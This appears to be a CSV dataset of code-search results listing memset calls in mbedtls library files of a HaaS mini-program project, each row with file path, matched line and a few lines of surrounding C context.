2021\haas-mini-program\utils\mbedtls\library\aes.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\aes.c,"memset( buf, 0, 16 );",120,1,"                             ( v == MBEDTLS_AES_DECRYPT ) ? ""dec"" : ""enc"" );

        memset( buf, 0, 16 );

        if( v == MBEDTLS_AES_DECRYPT )
"
2021\haas-mini-program\utils\mbedtls\library\aes.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\aes.c,"memset( iv , 0, 16 );",120,1,"                             ( v == MBEDTLS_AES_DECRYPT ) ? ""dec"" : ""enc"" );

        memset( iv , 0, 16 );
        memset( prv, 0, 16 );
        memset( buf, 0, 16 );
"
2021\haas-mini-program\utils\mbedtls\library\aes.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\aes.c,"memset( prv, 0, 16 );",120,1,"
        memset( iv , 0, 16 );
        memset( prv, 0, 16 );
        memset( buf, 0, 16 );

"
2021\haas-mini-program\utils\mbedtls\library\asn1parse.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\asn1parse.c,"memset( &params, 0, sizeof(mbedtls_asn1_buf) );",120,1,"    mbedtls_asn1_buf params;

    memset( &params, 0, sizeof(mbedtls_asn1_buf) );

    if( ( ret = mbedtls_asn1_get_alg( p, end, alg, &params ) ) != 0 )
"
2021\haas-mini-program\utils\mbedtls\library\bignum.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\bignum.c,"memset( X->p, 0, X->n * ciL );",120,1,"    MBEDTLS_MPI_CHK( mbedtls_mpi_grow( X, i ) );

    memset( X->p, 0, X->n * ciL );
    memcpy( X->p, Y->p, i * ciL );

"
2021\haas-mini-program\utils\mbedtls\library\bignum.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\bignum.c,"memset( s, 0, sizeof( s ) );",120,1,"    char s[ MBEDTLS_MPI_RW_BUFFER_SIZE ];

    memset( s, 0, sizeof( s ) );
    if( fgets( s, sizeof( s ) - 1, fin ) == NULL )
        return( MBEDTLS_ERR_MPI_FILE_IO_ERROR );
"
2021\haas-mini-program\utils\mbedtls\library\bignum.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\bignum.c,"memset( buf, 0, buflen );",120,1,"        return( MBEDTLS_ERR_MPI_BUFFER_TOO_SMALL );

    memset( buf, 0, buflen );

    for( i = buflen - 1, j = 0; n > 0; i--, j++, n-- )
"
2021\haas-mini-program\utils\mbedtls\library\bignum.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\bignum.c,"memset( T->p, 0, T->n * ciL );",120,1,"        return( MBEDTLS_ERR_MPI_BAD_INPUT_DATA );

    memset( T->p, 0, T->n * ciL );

    d = T->p;
"
2021\haas-mini-program\utils\mbedtls\library\bignum.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\bignum.c,"memset( W, 0, sizeof( W ) );",120,1,"    mbedtls_mpi_init( &RR ); mbedtls_mpi_init( &T );
    mbedtls_mpi_init( &Apos );
    memset( W, 0, sizeof( W ) );

    i = mbedtls_mpi_bitlen( E );
"
2021\haas-mini-program\utils\mbedtls\library\cipher.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\cipher.c,"memset( ctx, 0, sizeof( mbedtls_cipher_context_t ) );",120,1,"void mbedtls_cipher_init( mbedtls_cipher_context_t *ctx )
{
    memset( ctx, 0, sizeof( mbedtls_cipher_context_t ) );
}

"
2021\haas-mini-program\utils\mbedtls\library\ctr_drbg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ctr_drbg.c,"memset( ctx, 0, sizeof( mbedtls_ctr_drbg_context ) );",120,1,"void mbedtls_ctr_drbg_init( mbedtls_ctr_drbg_context *ctx )
{
    memset( ctx, 0, sizeof( mbedtls_ctr_drbg_context ) );

#if defined(MBEDTLS_THREADING_C)
"
2021\haas-mini-program\utils\mbedtls\library\ctr_drbg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ctr_drbg.c,"memset( key, 0, MBEDTLS_CTR_DRBG_KEYSIZE );",120,1,"    unsigned char key[MBEDTLS_CTR_DRBG_KEYSIZE];

    memset( key, 0, MBEDTLS_CTR_DRBG_KEYSIZE );

    mbedtls_aes_init( &ctx->aes_ctx );
"
2021\haas-mini-program\utils\mbedtls\library\ctr_drbg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ctr_drbg.c,"memset( buf, 0, MBEDTLS_CTR_DRBG_MAX_SEED_INPUT + MBEDTLS_CTR_DRBG_BLOCKSIZE + 16 );",120,1,"        return( MBEDTLS_ERR_CTR_DRBG_INPUT_TOO_BIG );

    memset( buf, 0, MBEDTLS_CTR_DRBG_MAX_SEED_INPUT + MBEDTLS_CTR_DRBG_BLOCKSIZE + 16 );
    mbedtls_aes_init( &aes_ctx );

"
2021\haas-mini-program\utils\mbedtls\library\ctr_drbg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ctr_drbg.c,"memset( chain, 0, MBEDTLS_CTR_DRBG_BLOCKSIZE );",120,1,"    {
        p = buf;
        memset( chain, 0, MBEDTLS_CTR_DRBG_BLOCKSIZE );
        use_len = buf_len;

"
2021\haas-mini-program\utils\mbedtls\library\ctr_drbg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ctr_drbg.c,"memset( tmp, 0, MBEDTLS_CTR_DRBG_SEEDLEN );",120,1,"    int i, j;

    memset( tmp, 0, MBEDTLS_CTR_DRBG_SEEDLEN );

    for( j = 0; j < MBEDTLS_CTR_DRBG_SEEDLEN; j += MBEDTLS_CTR_DRBG_BLOCKSIZE )
"
2021\haas-mini-program\utils\mbedtls\library\ctr_drbg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ctr_drbg.c,"memset( seed, 0, MBEDTLS_CTR_DRBG_MAX_SEED_INPUT );",120,1,"        return( MBEDTLS_ERR_CTR_DRBG_INPUT_TOO_BIG );

    memset( seed, 0, MBEDTLS_CTR_DRBG_MAX_SEED_INPUT );

    /*
"
2021\haas-mini-program\utils\mbedtls\library\ctr_drbg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ctr_drbg.c,"memset( add_input, 0, MBEDTLS_CTR_DRBG_SEEDLEN );",120,1,"        return( MBEDTLS_ERR_CTR_DRBG_INPUT_TOO_BIG );

    memset( add_input, 0, MBEDTLS_CTR_DRBG_SEEDLEN );

    if( ctx->reseed_counter > ctx->reseed_interval ||
"
2021\haas-mini-program\utils\mbedtls\library\debug.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\debug.c,"memset(txt, 0, sizeof(txt));",120,1,"
    idx = 0;
    memset(txt, 0, sizeof(txt));
    for (i = 0; i < len; i++) {
        if (i >= 4096) {
"
2021\haas-mini-program\utils\mbedtls\library\debug.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\debug.c,"memset(items, 0, sizeof(items));",120,1,"    char name[16];

    memset(items, 0, sizeof(items));

    if (mbedtls_pk_debug(pk, items) != 0) {
"
2021\haas-mini-program\utils\mbedtls\library\entropy.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\entropy.c,"memset( ctx, 0, sizeof(mbedtls_entropy_context) );",120,1,"void mbedtls_entropy_init( mbedtls_entropy_context *ctx )
{
    memset( ctx, 0, sizeof(mbedtls_entropy_context) );

#if defined(MBEDTLS_THREADING_C)
"
2021\haas-mini-program\utils\mbedtls\library\entropy.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\entropy.c,"memset( buf, 0, MBEDTLS_ENTROPY_BLOCK_SIZE );",120,1,"    while( ! done );

    memset( buf, 0, MBEDTLS_ENTROPY_BLOCK_SIZE );

#if defined(MBEDTLS_ENTROPY_SHA512_ACCUMULATOR)
"
2021\haas-mini-program\utils\mbedtls\library\entropy.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\entropy.c,"memset( &ctx->accumulator, 0, sizeof( mbedtls_sha512_context ) );",120,1,"     * Reset accumulator and counters and recycle existing entropy
     */
    memset( &ctx->accumulator, 0, sizeof( mbedtls_sha512_context ) );
    mbedtls_sha512_starts( &ctx->accumulator, 0 );
    mbedtls_sha512_update( &ctx->accumulator, buf, MBEDTLS_ENTROPY_BLOCK_SIZE );
"
2021\haas-mini-program\utils\mbedtls\library\entropy.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\entropy.c,"memset( &ctx->accumulator, 0, sizeof( mbedtls_sha256_context ) );",120,1,"     * Reset accumulator and counters and recycle existing entropy
     */
    memset( &ctx->accumulator, 0, sizeof( mbedtls_sha256_context ) );
    mbedtls_sha256_starts( &ctx->accumulator, 0 );
    mbedtls_sha256_update( &ctx->accumulator, buf, MBEDTLS_ENTROPY_BLOCK_SIZE );
"
2021\haas-mini-program\utils\mbedtls\library\entropy.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\entropy.c,"memset( output, 0x2a, len );",120,1,"    ((void) data);

    memset( output, 0x2a, len );
    *olen = len;

"
2021\haas-mini-program\utils\mbedtls\library\entropy.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\entropy.c,"memset( buf0, 0x00, sizeof( buf0 ) );",120,1,"        mbedtls_printf( ""  ENTROPY_BIAS test: "" );

    memset( buf0, 0x00, sizeof( buf0 ) );
    memset( buf1, 0x00, sizeof( buf1 ) );

"
2021\haas-mini-program\utils\mbedtls\library\entropy.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\entropy.c,"memset( buf1, 0x00, sizeof( buf1 ) );",120,1,"
    memset( buf0, 0x00, sizeof( buf0 ) );
    memset( buf1, 0x00, sizeof( buf1 ) );

    if( ( ret = mbedtls_entropy_source_self_test_gather( buf0, sizeof( buf0 ) ) ) != 0 )
"
2021\haas-mini-program\utils\mbedtls\library\error.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\error.c,"memset( buf, 0x00, buflen );",120,1,"        return;

    memset( buf, 0x00, buflen );

    if( ret < 0 )
"
2021\haas-mini-program\utils\mbedtls\library\md.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\md.c,"memset( ctx, 0, sizeof( mbedtls_md_context_t ) );",120,1,"void mbedtls_md_init( mbedtls_md_context_t *ctx )
{
    memset( ctx, 0, sizeof( mbedtls_md_context_t ) );
}

"
2021\haas-mini-program\utils\mbedtls\library\md.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\md.c,"memset( ipad, 0x36, ctx->md_info->block_size );",120,1,"    opad = (unsigned char *) ctx->hmac_ctx + ctx->md_info->block_size;

    memset( ipad, 0x36, ctx->md_info->block_size );
    memset( opad, 0x5C, ctx->md_info->block_size );

"
2021\haas-mini-program\utils\mbedtls\library\md.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\md.c,"memset( opad, 0x5C, ctx->md_info->block_size );",120,1,"
    memset( ipad, 0x36, ctx->md_info->block_size );
    memset( opad, 0x5C, ctx->md_info->block_size );

    for( i = 0; i < keylen; i++ )
"
2021\haas-mini-program\utils\mbedtls\library\md5.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\md5.c,"memset( ctx, 0, sizeof( mbedtls_md5_context ) );",120,1,"void mbedtls_md5_init( mbedtls_md5_context *ctx )
{
    memset( ctx, 0, sizeof( mbedtls_md5_context ) );
}

"
2021\haas-mini-program\utils\mbedtls\library\md5.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\md5.c,"memset(ctx, 0, sizeof(mbedtls_md5_context));",120,1,"
    //mbedtls_platform_zeroize( ctx, sizeof( mbedtls_md5_context ) );
    memset(ctx, 0, sizeof(mbedtls_md5_context));
}

"
2021\haas-mini-program\utils\mbedtls\library\md5.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\md5.c,"memset( ctx->buffer + used, 0, 56 - used );",120,1,"    {
        /* Enough room for padding + length in current block */
        memset( ctx->buffer + used, 0, 56 - used );
    }
    else
"
2021\haas-mini-program\utils\mbedtls\library\md5.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\md5.c,"memset( ctx->buffer + used, 0, 64 - used );",120,1,"    {
        /* We'll need an extra block */
        memset( ctx->buffer + used, 0, 64 - used );

        if( ( ret = mbedtls_internal_md5_process( ctx, ctx->buffer ) ) != 0 )
"
2021\haas-mini-program\utils\mbedtls\library\md5.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\md5.c,"memset( ctx->buffer, 0, 56 );",120,1,"            return( ret );

        memset( ctx->buffer, 0, 56 );
    }

"
2021\haas-mini-program\utils\mbedtls\library\net_sockets.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\net_sockets.c,"memset( &hints, 0, sizeof( hints ) );",120,1,"
    /* Bind to IPv6 and/or IPv4, but only in the desired protocol */
    memset( &hints, 0, sizeof( hints ) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = proto == MBEDTLS_NET_PROTO_UDP ? SOCK_DGRAM : SOCK_STREAM;
"
2021\haas-mini-program\utils\mbedtls\library\pem.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\pem.c,"memset( ctx, 0, sizeof( mbedtls_pem_context ) );",120,1,"void mbedtls_pem_init( mbedtls_pem_context *ctx )
{
    memset( ctx, 0, sizeof( mbedtls_pem_context ) );
}

"
2021\haas-mini-program\utils\mbedtls\library\pem.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\pem.c,"memset( iv, 0, iv_len );",120,1,"    size_t i, j, k;

    memset( iv, 0, iv_len );

    for( i = 0; i < iv_len * 2; i++, s++ )
"
2021\haas-mini-program\utils\mbedtls\library\pkparse.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\pkparse.c,"memset( params, 0, sizeof(mbedtls_asn1_buf) );",120,1,"    mbedtls_asn1_buf alg_oid;

    memset( params, 0, sizeof(mbedtls_asn1_buf) );

    if( ( ret = mbedtls_asn1_get_alg( p, end, &alg_oid, params ) ) != 0 )
"
2021\haas-mini-program\utils\mbedtls\library\pkparse.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\pkparse.c,"memset( buf, 0, sizeof( buf ) );",120,1,"#endif

    memset( buf, 0, sizeof( buf ) );

    p = (unsigned char *) key;
"
2021\haas-mini-program\utils\mbedtls\library\pk_wrap.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\pk_wrap.c,"memset( hash, 0x2a, sizeof( hash ) );",120,1,"        return( MBEDTLS_ERR_RSA_KEY_CHECK_FAILED );

    memset( hash, 0x2a, sizeof( hash ) );

    if( ( ret = rsa_alt_sign_wrap( (void *) prv, MBEDTLS_MD_NONE,
"
2021\haas-mini-program\utils\mbedtls\library\pk_wrap.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\pk_wrap.c,"memset( ctx, 0, sizeof( mbedtls_rsa_alt_context ) );",120,1,"
    if( ctx != NULL )
        memset( ctx, 0, sizeof( mbedtls_rsa_alt_context ) );

    return( ctx );
"
2021\haas-mini-program\utils\mbedtls\library\rsa.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\rsa.c,"memset( ctx, 0, sizeof( mbedtls_rsa_context ) );",120,1,"               int hash_id )
{
    memset( ctx, 0, sizeof( mbedtls_rsa_context ) );

    mbedtls_rsa_set_padding( ctx, padding, hash_id );
"
2021\haas-mini-program\utils\mbedtls\library\rsa.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\rsa.c,"memset( mask, 0, MBEDTLS_MD_MAX_SIZE );",120,1,"    size_t i, use_len;

    memset( mask, 0, MBEDTLS_MD_MAX_SIZE );
    memset( counter, 0, 4 );

"
2021\haas-mini-program\utils\mbedtls\library\rsa.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\rsa.c,"memset( counter, 0, 4 );",120,1,"
    memset( mask, 0, MBEDTLS_MD_MAX_SIZE );
    memset( counter, 0, 4 );

    hlen = mbedtls_md_get_size( md_ctx->md_info );
"
2021\haas-mini-program\utils\mbedtls\library\rsa.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\rsa.c,"memset( output, 0, olen );",120,1,"        return( MBEDTLS_ERR_RSA_BAD_INPUT_DATA );

    memset( output, 0, olen );

    *p++ = 0;
"
2021\haas-mini-program\utils\mbedtls\library\rsa.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\rsa.c,"memset( sig, 0, olen );",120,1,"        return( MBEDTLS_ERR_RSA_BAD_INPUT_DATA );

    memset( sig, 0, olen );

    /* Generate salt of length slen */
"
2021\haas-mini-program\utils\mbedtls\library\rsa.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\rsa.c,"memset( p, 0xFF, nb_pad );",120,1,"    *p++ = 0;
    *p++ = MBEDTLS_RSA_SIGN;
    memset( p, 0xFF, nb_pad );
    p += nb_pad;
    *p++ = 0;
"
2021\haas-mini-program\utils\mbedtls\library\rsa.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\rsa.c,"memset( zeros, 0, 8 );",120,1,"    slen = siglen - hlen - 1; /* Currently length of salt + padding */

    memset( zeros, 0, 8 );

    /*
"
2021\haas-mini-program\utils\mbedtls\library\sha1.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\sha1.c,"memset( ctx, 0, sizeof( mbedtls_sha1_context ) );",120,1,"void mbedtls_sha1_init( mbedtls_sha1_context *ctx )
{
    memset( ctx, 0, sizeof( mbedtls_sha1_context ) );
}

"
2021\haas-mini-program\utils\mbedtls\library\sha1.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\sha1.c,"memset( buf, 'a', buflen = 1000 );",120,1,"        if( i == 2 )
        {
            memset( buf, 'a', buflen = 1000 );

            for( j = 0; j < 1000; j++ )
"
2021\haas-mini-program\utils\mbedtls\library\sha256.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\sha256.c,"memset( ctx, 0, sizeof( mbedtls_sha256_context ) );",120,1,"void mbedtls_sha256_init( mbedtls_sha256_context *ctx )
{
    memset( ctx, 0, sizeof( mbedtls_sha256_context ) );
}

"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( padding, (unsigned char) ('A' + i), 1 + i );",120,1,"    for( i = 0; i < dlen / 16; i++ )
    {
        memset( padding, (unsigned char) ('A' + i), 1 + i );

        mbedtls_sha1_starts( &sha1 );
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( &transform->ctx_deflate, 0, sizeof( transform->ctx_deflate ) );",120,1,"        MBEDTLS_SSL_DEBUG_MSG( 3, ( ""Initializing zlib states"" ) );

        memset( &transform->ctx_deflate, 0, sizeof( transform->ctx_deflate ) );
        memset( &transform->ctx_inflate, 0, sizeof( transform->ctx_inflate ) );

"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( &transform->ctx_inflate, 0, sizeof( transform->ctx_inflate ) );",120,1,"
        memset( &transform->ctx_deflate, 0, sizeof( transform->ctx_deflate ) );
        memset( &transform->ctx_inflate, 0, sizeof( transform->ctx_inflate ) );

        if( deflateInit( &transform->ctx_deflate,
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( pad_1, 0x36, 48 );",120,1,"    mbedtls_sha1_clone( &sha1, &ssl->handshake->fin_sha1 );

    memset( pad_1, 0x36, 48 );
    memset( pad_2, 0x5C, 48 );

"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( pad_2, 0x5C, 48 );",120,1,"
    memset( pad_1, 0x36, 48 );
    memset( pad_2, 0x5C, 48 );

    mbedtls_md5_update( &md5, ssl->session_negotiate->master, 48 );
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( p, 0, psk_len );",120,1,"            return( MBEDTLS_ERR_SSL_BAD_INPUT_DATA );

        memset( p, 0, psk_len );
        p += psk_len;
    }
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( padding, 0x36, padlen );",120,1,"    header[10] = (unsigned char)( len      );

    memset( padding, 0x36, padlen );
    mbedtls_md_starts( md_ctx );
    mbedtls_md_update( md_ctx, secret,  md_size );
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( padding, 0x5C, padlen );",120,1,"    mbedtls_md_finish( md_ctx, buf +    len     );

    memset( padding, 0x5C, padlen );
    mbedtls_md_starts( md_ctx );
    mbedtls_md_update( md_ctx, secret,    md_size );
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( ssl->out_msg + 6, 0x00, 3 );",120,1,"
            /* We don't fragment, so frag_offset = 0 and frag_len = len */
            memset( ssl->out_msg + 6, 0x00, 3 );
            memcpy( ssl->out_msg + 9, ssl->out_msg + 1, 3 );
        }
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( mask + offset / 8, 0xFF, len / 8 );",120,1,"    }

    memset( mask + offset / 8, 0xFF, len / 8 );
}

"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( ssl->handshake->hs_msg + 6, 0, 3 );",120,1,"         * then add standardised fragment_offset and fragment_length */
        memcpy( ssl->handshake->hs_msg, ssl->in_msg, 6 );
        memset( ssl->handshake->hs_msg + 6, 0, 3 );
        memcpy( ssl->handshake->hs_msg + 9,
                ssl->handshake->hs_msg + 1, 3 );
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( ssl->in_ctr, 0, 8 );",120,1,"    else
#endif /* MBEDTLS_SSL_PROTO_DTLS */
    memset( ssl->in_ctr, 0, 8 );

    /*
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( padbuf, 0x36, 48 );",120,1,"                                       : ""SRVR"";

    memset( padbuf, 0x36, 48 );

    mbedtls_md5_update( &md5, (const unsigned char *) sender, 4 );
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( padbuf, 0x5C, 48 );",120,1,"    mbedtls_sha1_finish( &sha1, sha1sum );

    memset( padbuf, 0x5C, 48 );

    mbedtls_md5_starts( &md5 );
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( ssl->out_ctr + 2, 0, 6 );",120,1,"
        /* Set sequence_number to zero */
        memset( ssl->out_ctr + 2, 0, 6 );

        /* Increment epoch */
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( ssl->out_ctr, 0, 8 );",120,1,"    else
#endif /* MBEDTLS_SSL_PROTO_DTLS */
    memset( ssl->out_ctr, 0, 8 );

    ssl->transform_out = ssl->transform_negotiate;
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( handshake, 0, sizeof( mbedtls_ssl_handshake_params ) );",120,1,"static void ssl_handshake_params_init( mbedtls_ssl_handshake_params *handshake )
{
    memset( handshake, 0, sizeof( mbedtls_ssl_handshake_params ) );

#if defined(MBEDTLS_SSL_PROTO_SSL3) || defined(MBEDTLS_SSL_PROTO_TLS1) || \
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( transform, 0, sizeof(mbedtls_ssl_transform) );",120,1,"static void ssl_transform_init( mbedtls_ssl_transform *transform )
{
    memset( transform, 0, sizeof(mbedtls_ssl_transform) );

    mbedtls_cipher_init( &transform->cipher_ctx_enc );
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( session, 0, sizeof(mbedtls_ssl_session) );",120,1,"void mbedtls_ssl_session_init( mbedtls_ssl_session *session )
{
    memset( session, 0, sizeof(mbedtls_ssl_session) );
}

"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( ssl, 0, sizeof( mbedtls_ssl_context ) );",120,1,"void mbedtls_ssl_init( mbedtls_ssl_context *ssl )
{
    memset( ssl, 0, sizeof( mbedtls_ssl_context ) );
}

"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( ssl->own_verify_data, 0, MBEDTLS_SSL_VERIFY_DATA_MAX_LEN );",120,1,"
    ssl->verify_data_len = 0;
    memset( ssl->own_verify_data, 0, MBEDTLS_SSL_VERIFY_DATA_MAX_LEN );
    memset( ssl->peer_verify_data, 0, MBEDTLS_SSL_VERIFY_DATA_MAX_LEN );
#endif
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( ssl->peer_verify_data, 0, MBEDTLS_SSL_VERIFY_DATA_MAX_LEN );",120,1,"    ssl->verify_data_len = 0;
    memset( ssl->own_verify_data, 0, MBEDTLS_SSL_VERIFY_DATA_MAX_LEN );
    memset( ssl->peer_verify_data, 0, MBEDTLS_SSL_VERIFY_DATA_MAX_LEN );
#endif
    ssl->secure_renegotiation = MBEDTLS_SSL_LEGACY_RENEGOTIATION;
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( ssl->out_buf, 0, MBEDTLS_SSL_BUFFER_LEN );",120,1,"    ssl->transform_out = NULL;

    memset( ssl->out_buf, 0, MBEDTLS_SSL_BUFFER_LEN );
    if( partial == 0 )
        memset( ssl->in_buf, 0, MBEDTLS_SSL_BUFFER_LEN );
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( ssl->in_buf, 0, MBEDTLS_SSL_BUFFER_LEN );",120,1,"    memset( ssl->out_buf, 0, MBEDTLS_SSL_BUFFER_LEN );
    if( partial == 0 )
        memset( ssl->in_buf, 0, MBEDTLS_SSL_BUFFER_LEN );

#if defined(MBEDTLS_SSL_HW_RECORD_ACCEL)
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( conf, 0, sizeof( mbedtls_ssl_config ) );",120,1,"void mbedtls_ssl_config_init( mbedtls_ssl_config *conf )
{
    memset( conf, 0, sizeof( mbedtls_ssl_config ) );
}

"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( conf->renego_period,     0x00, 2 );",120,1,"#if defined(MBEDTLS_SSL_RENEGOTIATION)
    conf->renego_max_records = MBEDTLS_SSL_RENEGO_MAX_RECORDS_DEFAULT;
    memset( conf->renego_period,     0x00, 2 );
    memset( conf->renego_period + 2, 0xFF, 6 );
#endif
"
2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\utils\mbedtls\library\ssl_tls.c,"memset( conf->renego_period + 2, 0xFF, 6 );",120,1,"    conf->renego_max_records = MBEDTLS_SSL_RENEGO_MAX_RECORDS_DEFAULT;
    memset( conf->renego_period,     0x00, 2 );
    memset( conf->renego_period + 2, 0xFF, 6 );
#endif

"
